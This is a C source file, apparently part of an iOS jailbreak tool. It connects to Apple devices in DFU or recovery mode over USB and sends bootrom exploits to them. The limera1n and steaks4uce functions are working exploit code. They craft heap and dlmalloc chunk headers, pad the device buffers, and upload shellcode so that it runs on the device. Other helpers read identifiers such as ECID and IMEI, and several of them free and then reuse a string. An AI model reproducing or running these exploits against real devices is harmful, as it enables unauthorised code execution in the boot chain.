#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <libusb-1.0/libusb.h>
#include <unistd.h>
#include <sys/stat.h>
#include <signal.h>
#include <CoreFoundation/CoreFoundation.h>
#include "steaks4uce.h"
#include "limera1n.h"

#define dprintf(M, ...) printf("[DEBUG] (%s:%d) " M "\r\n", __FILE__, __LINE__, ##__VA_ARGS__)

static struct libusb_device_handle *device = NULL;
int RecoveryMode = 1;
int kDFUMode = 0;
char* serial_str = NULL;
char* nonce_str = NULL;
char* imei_str = NULL;
char* srnm_str = NULL;

/* MobileDevice API */
extern int AMDeviceConnect (void *device);
extern int AMDeviceIsPaired (void *device);
extern int AMDeviceValidatePairing (void *device);
extern int AMDeviceStartSession (void *device);
extern int AMDeviceEnterRecovery (void *device);
extern int AMDeviceNotificationSubscribe(void *, int , int , int, void **);
struct AMDeviceNotificationCallbackInformation {
    void 		*deviceHandle;
    uint32_t	msgType;
} ;

void enterrecovery(struct AMDeviceNotificationCallbackInformation *CallbackInfo) {
    void *deviceHandle = CallbackInfo->deviceHandle;
    
    int rc = AMDeviceConnect(deviceHandle);
    
    if (rc) {
        dprintf ("AMDeviceConnect returned: %d.", rc);
        exit(EXIT_FAILURE);
    }
    
    rc = AMDeviceValidatePairing(deviceHandle);
    
    if (rc)
    {
        dprintf ("AMDeviceValidatePairing() returned: %d.", rc);
        exit(EXIT_FAILURE);
        
    }
    
    rc = AMDeviceStartSession(deviceHandle);
    if (rc)
    {
        dprintf ("AMStartSession() returned: %d.", rc);
        exit(EXIT_FAILURE);
        
    }
    rc = AMDeviceEnterRecovery(deviceHandle);
    if (rc)
    {
        dprintf ("AMDeviceEnterRecovery() returned: %d.", rc);
        exit(EXIT_FAILURE);
        
    }
    
    CFRunLoopStop(CFRunLoopGetCurrent());
}

int enterdfu() {
    char answer;
    dprintf("Do you want to enter DFU ? [\"y\" or \"Y\" / Whatever] ");
    printf("Answer: ");
    scanf(" %c", &answer);
    if (answer == 'Y' || answer == 'y') {
        while (libusb_open_device_with_vid_pid(NULL, 0x05AC, 0x1227) == NULL) {
            if (libusb_open_device_with_vid_pid(NULL, 0x05AC, 0x1293) != NULL) {
                dprintf("Entering recovery mode.");
                void* subscribe;
                int rc = AMDeviceNotificationSubscribe(enterrecovery, 0, 0, 0, &subscribe);
                if (rc < 0) {
                    dprintf("Unable to subscribe: AMDeviceNotificationSubscribe returned %d.", rc);
                    return EXIT_FAILURE;
                }
                CFRunLoopRun();
                sleep(5);
                dprintf("Prepare to hold power and home button.");
                sleep(2);
                dprintf("Hold power and home button for 10 seconds.");
                sleep(8);
                dprintf("Prepare to release power button.");
                sleep(2);
                dprintf("Release power button.");
                sleep(2);
            }
            
            if (libusb_open_device_with_vid_pid(NULL, 0x05AC, 0x1281) != NULL) {
                dprintf("Prepare to hold power and home button.");
                sleep(2);
                dprintf("Hold power and home button for 10 seconds.");
                sleep(8);
                dprintf("Prepare to release power button.");
                sleep(2);
                dprintf("Release power button.");
                sleep(2);
            }
            
            if (libusb_open_device_with_vid_pid(NULL, 0x05AC, 0x1227) == NULL) {
                dprintf("Turn off your device.");
                sleep(5);
                dprintf("Prepare to hold power and home button.");
                sleep(2);
                dprintf("Hold power and home button for 10 seconds.");
                sleep(8);
                dprintf("Prepare to release power button.");
                sleep(2);
                dprintf("Hold home button for 10 seconds.");
                sleep(10);
            }
        }
        return EXIT_SUCCESS;
    }
    return EXIT_FAILURE;
}

int send_buffer(unsigned char* data, int len, int mode) {
    
    int packets = len / 0x800;
    
    if(len % 0x800) {
        packets++;
    }
    
    int last = len % 0x800;
    
    if(!last) {
        last = 0x800;
    }
    
    if (mode == RecoveryMode) {
        libusb_control_transfer(device, 0x41, 0, 0, 0, NULL, 0, 1000);
    }
    
    int i = 0;
    
    char response[6];
    unsigned int sizesent=0;
    int bytes = 0;
    for(i = 0; i < packets; i++) {
        
        int size = i + 1 < packets ? 0x800 : last;
        sizesent+=size;
        dprintf("Sending packet %d of %d (0x%08x of 0x%08x bytes)", i+1, packets, sizesent, len);
        if (mode == 1) {
            if(libusb_bulk_transfer(device, 0x04, &data[i * 0x800],size ,&bytes,1000) < 0){
                dprintf("Error when sending packet.");
                return EXIT_FAILURE;
            }
        }
        else{
            bytes = libusb_control_transfer(device, 0x21, 1, i, 0, &data[i * 0x800], size, 1000);
        }
        if (bytes != size) {
            dprintf("Error sending packet from buffer.");
            return EXIT_FAILURE;
        }
        if (mode == kDFUMode) {
        if( libusb_control_transfer(device, 0xA1, 3, 0, 0, (unsigned char*)response, 6, 1000) != 6) {
            
            dprintf("Error receiving status from buffer.");
            return EXIT_FAILURE;
        }
        
        if(response[4] != 5) {
            
            dprintf("Invalid status error from buffer.");
            return EXIT_FAILURE;
        }
        }
    }
    dprintf("Upload successfull.");
    if (mode == kDFUMode) {
    dprintf("Executing buffer.");
    libusb_control_transfer(device, 0x21, 1, i, 0, data, 0, 1000);
    
    for(i = 6; i <= 8; i++) {
        
        if( libusb_control_transfer(device, 0xA1, 3, 0, 0, (unsigned char*)response, 6, 1000) != 6) {
            
            dprintf("Error receiving execution status from buffer.");
            return EXIT_FAILURE;
        }
        
        if(response[4] != i) {
            
            dprintf("Invalid execution status from buffer.");
            return EXIT_FAILURE;
        }
    }
    dprintf("Successfully executed file.");
    libusb_reenumerate_device(device);
    }
    return EXIT_SUCCESS;
}

int send_file(const char* filename, int mode) {
	
	FILE* file = fopen(filename, "rb");
	
	if(file == NULL) {
		
		dprintf("Unable to find file. (%s)",filename);
		return EXIT_FAILURE;
		
	}
	
	fseek(file, 0, SEEK_END);
	unsigned int len = ftell(file);
	fseek(file, 0, SEEK_SET);
	
	char* buffer = malloc(len);
	
	if (buffer == NULL) {
		
		dprintf("Error allocating memory.");
		fclose(file);
		return EXIT_FAILURE;
		
	}
	
	fread(buffer, 1, len, file);
	fclose(file);
    if (send_buffer((unsigned char*)buffer,len,mode) != EXIT_SUCCESS) {
        dprintf("Failed to upload buffer.");
        return EXIT_FAILURE;
    }
	free(buffer);
	return EXIT_SUCCESS;
}

int send_cmd(char* command) {
    
    size_t length = strlen(command);
    
    if (length >= 0x200) {
        dprintf("Failed to send command (too long).");
        return EXIT_FAILURE;
    }
    
    if (!libusb_control_transfer(device, 0x40, 0, 0, 0, (unsigned char*)command, (length + 1), 1000)) {
        dprintf("Failed to send command.");
        return EXIT_FAILURE;
    }
    
    return EXIT_SUCCESS;
    
}

int limera1n() {
    int i, ret;
    unsigned char buf[0x800];
    unsigned char shellcode[0x800];
    unsigned int stack_address = 0x8403BF9C;
    unsigned int shellcode_address = 0x8402B001;
    unsigned int shellcode_length = 0;
    
    
    memset(shellcode, 0x0, 0x800);
    shellcode_length = sizeof(limera1n_payload);
    memcpy(shellcode, limera1n_payload, shellcode_length);
    
    dprintf("Resetting usb counters.");
    ret = libusb_control_transfer(device, 0x21, 4, 0, 0, 0, 0, 1000);
    if (ret < LIBUSB_SUCCESS) {
        dprintf("Failed to reset usb counters.");
        return EXIT_FAILURE;
    }
    
    memset(buf, 0xCC, 0x800);
    for(i = 0; i < 0x800; i += 0x40) {
        unsigned int* heap = (unsigned int*)(buf+i);
        heap[0] = 0x405;
        heap[1] = 0x101;
        heap[2] = shellcode_address;
        heap[3] = stack_address;
    }
    
    dprintf("Sending chunk headers.");
    libusb_control_transfer(device, 0x21, 1, 0, 0, buf, 0x800, 1000);
    
    memset(buf, 0xCC, 0x800);
    for(i = 0; i < 0x2A800; i += 0x800) {
        libusb_control_transfer(device, 0x21, 1, 0, 0, buf, 0x800, 1000);
    }
    
    dprintf("Sending exploit payload.");
    libusb_control_transfer(device, 0x21, 1, 0, 0, shellcode, 0x800, 1000);
    
    dprintf("Sending fake data.");
    memset(buf, 0xBB, 0x800);
    libusb_control_transfer(device, 0xA1, 1, 0, 0, buf, 0x800, 1000);
    libusb_control_transfer(device, 0x21, 1, 0, 0, buf, 0x800, 10);
    
    libusb_control_transfer(device, 0x21, 2, 0, 0, buf, 0, 1000);
    
    libusb_reenumerate_device(device);
    dprintf("Exploit sent.");
    
    
    return EXIT_SUCCESS;
}

int steaks4uce() {
    int i, ret;
    unsigned char data[0x800];
    unsigned char payload[] = {
        /* free'd buffer dlmalloc header: */
        0x84, 0x00, 0x00, 0x00, // 0x00: previous_chunk
        0x05, 0x00, 0x00, 0x00, // 0x04: next_chunk
        /* free'd buffer contents: (malloc'd size=0x1C, real size=0x20, see sub_9C8) */
        0x80, 0x00, 0x00, 0x00, // 0x08: (0x00) direction
        0x80, 0x62, 0x02, 0x22, // 0x0c: (0x04) usb_response_buffer
        0xff, 0xff, 0xff, 0xff, // 0x10: (0x08)
        0x00, 0x00, 0x00, 0x00, // 0x14: (0x0c) data size (filled by the code just after)
        0x00, 0x01, 0x00, 0x00, // 0x18: (0x10)
        0x00, 0x00, 0x00, 0x00, // 0x1c: (0x14)
        0x00, 0x00, 0x00, 0x00, // 0x20: (0x18)
        0x00, 0x00, 0x00, 0x00, // 0x24: (0x1c)
        /* attack dlmalloc header: */
        0x15, 0x00, 0x00, 0x00, // 0x28: previous_chunk
        0x02, 0x00, 0x00, 0x00, // 0x2c: next_chunk : 0x2 choosed randomly :-)
        0x01, 0x38, 0x02, 0x22, // 0x30: FD : shellcode_thumb_start()
        //0x90, 0xd7, 0x02, 0x22, // 0x34: BK : free() LR in stack
        0xfc, 0xd7, 0x02, 0x22, // 0x34: BK : exception_irq() LR in stack
				};
    
    dprintf("Executing steaks4uce exploit ...");
    dprintf("Resetting usb counters.");
    
    ret = libusb_control_transfer(device, 0x21, 4, 0, 0, 0, 0, 1000);
    if (ret < LIBUSB_SUCCESS) {
        dprintf("Failed to reset usb counters.");
        return EXIT_FAILURE;
    }
    
    dprintf("Padding to 0x23800...");
    memset(data, 0, 0x800);
    for(i = 0; i < 0x23800 ; i+=0x800)  {
        
        ret = libusb_control_transfer(device, 0x21, 1, 0, 0, data, 0x800, 1000);
        if (ret < LIBUSB_SUCCESS) {
            dprintf("Failed to push data to the device.");
            return EXIT_FAILURE;
        }
    }
    dprintf("Uploading shellcode.");
    memset(data, 0, 0x800);
    memcpy(data, steaks4uce_payload, sizeof(steaks4uce_payload));
    
    ret = libusb_control_transfer(device, 0x21, 1, 0, 0, data, 0x800, 1000);
    if (ret < LIBUSB_SUCCESS) {
        dprintf("Failed to upload shellcode.");
        return EXIT_FAILURE;
    }
    
    dprintf("Resetting usb counters.");
    
    ret = libusb_control_transfer(device, 0x21, 4, 0, 0, 0, 0, 1000);
    if (ret < LIBUSB_SUCCESS) {
        dprintf("Failed to reset usb counters.");
        return EXIT_FAILURE;
    }
    
    int send_size = 0x100 + sizeof(payload);
    *((unsigned int*) &payload[0x14]) = send_size;
    memset(data, 0, 0x800);
    memcpy(&data[0x100], payload, sizeof(payload));
    
    ret = libusb_control_transfer(device, 0x21, 1, 0, 0, data, send_size , 1000);
    if (ret < LIBUSB_SUCCESS) {
        dprintf("Failed to send steaks4uce to the device.");
        return EXIT_FAILURE;
    }
    
    ret = libusb_control_transfer(device, 0xA1, 1, 0, 0, data, send_size , 1000);
    if (ret < LIBUSB_SUCCESS) {
        dprintf("Failed to execute steaks4uce.");
        return EXIT_FAILURE;
    }
    
    dprintf("steaks4uce sent & executed successfully.");
    
    return EXIT_SUCCESS;
    
}

int connect2(int pid,int attempts) {
    for (int i = 1; i < attempts + 1; i++) {
        device = libusb_open_device_with_vid_pid(NULL, 0x05AC, pid);
        if (device == NULL) {
            dprintf("Failed to connect, attempt (%d).",i);
            sleep(1);
        } else {
            if (pid == 0x1281) {
                dprintf("Setting to configuration (1).");
                if(libusb_set_configuration(device, 1) < LIBUSB_SUCCESS) {
                    dprintf("Error setting configuration.");
                    return EXIT_FAILURE;
                }
                dprintf("Setting to interface (0:0).");
                if(libusb_claim_interface(device, 0) < LIBUSB_SUCCESS) {
                    
                    dprintf("Error claiming interface.");
                    return EXIT_FAILURE;
                    
                }
                
                if(libusb_set_interface_alt_setting(device, 0, 0) < LIBUSB_SUCCESS) {
                    
                    dprintf("Error claiming alt interface.");
                    return EXIT_FAILURE;
                    
                }

            }
            return EXIT_SUCCESS;
        }
    }
    if (enterdfu() != EXIT_SUCCESS) {
        return EXIT_FAILURE;
    }
    return EXIT_SUCCESS;
}

void libflursch_exit() {
    if (device == NULL) {
        dprintf("Failed to connect.");
        libusb_exit(NULL);
        exit(EXIT_FAILURE);
    }
    libusb_release_interface(device, 0);
    libusb_close(device);
    libusb_exit(NULL);
}

void libflursch_init() {
    
    libusb_init(NULL);
    (void) signal(SIGTERM, libflursch_exit);
    (void) signal(SIGQUIT, libflursch_exit);
    (void) signal(SIGINT, libflursch_exit);
    
}

void get_serial() {
    char info[256];
    libusb_get_string_descriptor_ascii(device, 3, (unsigned char *)info, 256);
    if (strlen(info) == 0) {
        dprintf("No information returned.");
        exit(EXIT_FAILURE);
    }
    dprintf("Serial String from Device: \"%s\"", info);
    serial_str = strdup(info);
}

void get_nonce() {
    char info[256];
    libusb_get_string_descriptor_ascii(device, 1, (unsigned char *)info, 256);
    if (strlen(info) == 0) {
        dprintf("No information returned.");
        exit(EXIT_FAILURE);
    }
    dprintf("Nonce String from Device: \"%s\"", info);
    nonce_str = strdup(info);
}

unsigned int get_cpid() {
    unsigned int cpid;
    if(!serial_str) get_serial();
    char* cpid_string = strstr(serial_str, "CPID:");
    free(serial_str);
    sscanf(cpid_string, "CPID:%04X", &cpid);
    return cpid;
}

unsigned int get_cprv() {
    unsigned int cprv;
    if(!serial_str) get_serial();
    char* cprv_string = strstr(serial_str, "CPRV:");
    free(serial_str);
    sscanf(cprv_string, "CPRV:%02X", &cprv);
    return cprv;
}

unsigned int get_cpfm() {
    unsigned int cpfm;
    if(!serial_str) get_serial();
    char* cpfm_string = strstr(serial_str, "CPFM:");
    sscanf(cpfm_string, "CPFM:%02X", &cpfm);
    return cpfm;
}

unsigned int get_scep() {
    unsigned int scep;
    if(!serial_str) get_serial();
    char* scep_string = strstr(serial_str, "SCEP:");
    free(serial_str);
    sscanf(scep_string, "SCEP:%02X", &scep);
    return scep;
}

unsigned int get_bdid() {
    unsigned int bdid;
    if(!serial_str) get_serial();
    char* bdid_string = strstr(serial_str, "BDID:");
    free(serial_str);
    sscanf(bdid_string, "BDID:%02X", &bdid);
    return bdid;
}

unsigned int get_ibfl() {
    unsigned int ibfl;
    if(!serial_str) get_serial();
    char* ibfl_string = strstr(serial_str, "IBFL:");
    free(serial_str);
    sscanf(ibfl_string, "IBFL:%02X", &ibfl);
    return ibfl;
}

unsigned long long int get_ecid() {
    unsigned long long int ecid;
    if(!serial_str) get_serial();
    char* ecid_string = strstr(serial_str, "ECID:");
    free(serial_str);
    sscanf(ecid_string, "ECID:%016llX", &ecid);
    return ecid;
}

float get_srtg() {
    float srtg;
    if(!serial_str) get_serial();
    char* srtg_string = strstr(serial_str, "SRTG:");
    free(serial_str);
    sscanf(srtg_string, "SRTG:[iBoot-%f", &srtg);
    return srtg;
}

void get_srnm() {
    char srnm[256];
    if(!serial_str) get_serial();
    char* srnm_string = strstr(serial_str, "SRNM:");
    free(serial_str);
    sscanf(srnm_string, "SRNM:[%s", srnm);
    srnm_str = strdup(srnm);
}

void get_imei() {
    char imei[256];
    if(!serial_str) get_serial();
    char* imei_string = strstr(serial_str, "IMEI:");
    free(serial_str);
    sscanf(imei_string, "IMEI:[%s", imei);
    imei_str = strdup(imei);
}

int file_exists(const char* fileName) {
    struct stat buf;
    return stat(fileName, &buf);
}

int inject() {
    if (connect2(0x1227,10) != EXIT_SUCCESS) {
        dprintf("Cannot connect to device.");
        return EXIT_FAILURE;
    }
    
    dprintf("Connected.");
    /*
    if (get_cpid() == 0x8930) {
        if (limera1n() != EXIT_SUCCESS) {
            dprintf("Error sending limera1n.");
            return EXIT_FAILURE;
        }
    }
    */
    if (get_cpid() == 0x8720) {
        if (steaks4uce() != EXIT_SUCCESS) {
            dprintf("Error sending limera1n.");
            return EXIT_FAILURE;
        }
    }
    
    sleep(2);
    dprintf("Reconnecting to device.");
    libusb_close(device);
    if (connect2(0x1227,10) != EXIT_SUCCESS) {
        dprintf("Cannot reconnect to device.");
        return EXIT_FAILURE;
    }
    
    return EXIT_SUCCESS;
}